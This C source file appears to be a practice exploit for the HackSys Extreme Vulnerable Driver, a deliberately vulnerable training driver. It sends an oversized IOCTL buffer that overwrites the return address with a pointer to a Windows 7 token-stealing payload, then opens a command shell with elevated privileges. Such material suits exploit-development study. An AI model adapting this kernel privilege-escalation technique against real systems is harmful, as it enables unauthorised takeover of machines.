 #include <Windows.h>

#include <string.h>
#include <stdio.h>

#include "payload.h"

#define USE_INLINE

#define EIP_OFFSET 2080 //offset of the address in the buffer that will overwrite the EIP

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";

HANDLE open_device(const char* device_name)
{
    HANDLE device = CreateFileA(device_name,
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
    );
    return device;
}

void close_device(HANDLE device)
{
    CloseHandle(device);
}

BOOL send_ioctl(HANDLE device, DWORD ioctl_code)
{
    LPVOID payload_ptr = NULL;

#ifdef USE_INLINE
    printf("Using inline payload\n");
    payload_ptr = &TokenStealingPayloadWin7;
#else
    printf("Using shellcode payload\n");
    payload_ptr = kShellcode;
#endif
    if (payload_ptr == NULL) {
        printf("[-] Payload cannot be NULL\n");
        return FALSE;
    }
    const size_t bufSize = EIP_OFFSET + sizeof(DWORD);
    char* lpInBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);

    RtlFillMemory(lpInBuffer, bufSize, 0x41);

    DWORD* address_field = (DWORD*)(lpInBuffer + EIP_OFFSET);
    *address_field = (DWORD)(payload_ptr);

    DWORD size_returned = 0;
    BOOL is_ok = DeviceIoControl(device,
        ioctl_code,
        lpInBuffer,
        EIP_OFFSET + sizeof(DWORD),
        NULL, //outBuffer -> None
        0, //outBuffer size -> 0
        &size_returned,
        NULL
    );
    //release the input bufffer:
    HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
    return is_ok;
}

int main()
{
    HANDLE dev = open_device(kDevName);
    if (dev == INVALID_HANDLE_VALUE) {
        printf("Failed to open the device! Is HEVD installed?\n");
        system("pause");
        return -1;
    }
    
    send_ioctl(dev, HACKSYS_EVD_IOCTL_STACK_OVERFLOW);
    system("cmd.exe");
    close_device(dev);
    system("pause");
    return 0;
}
